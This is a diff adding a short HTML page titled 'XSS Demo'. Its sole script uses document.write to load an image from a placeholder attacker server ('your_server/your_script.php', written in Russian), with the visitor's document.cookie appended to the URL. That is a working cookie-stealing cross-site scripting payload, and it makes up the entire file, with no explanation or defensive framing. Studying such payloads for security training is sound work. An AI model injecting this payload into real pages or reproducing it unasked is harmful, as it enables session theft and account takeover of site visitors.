@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>XSS Demo</title>
+</head>
+<body>
+
+<h1>XSS Demo</h1>
+
+<script>
+  document.write('<img src="http://ваш_сервер/ваш_скрипт.php?cookie=' + encodeURIComponent(document.cookie) + '">');
+</script>
+
+</body>
+</html>
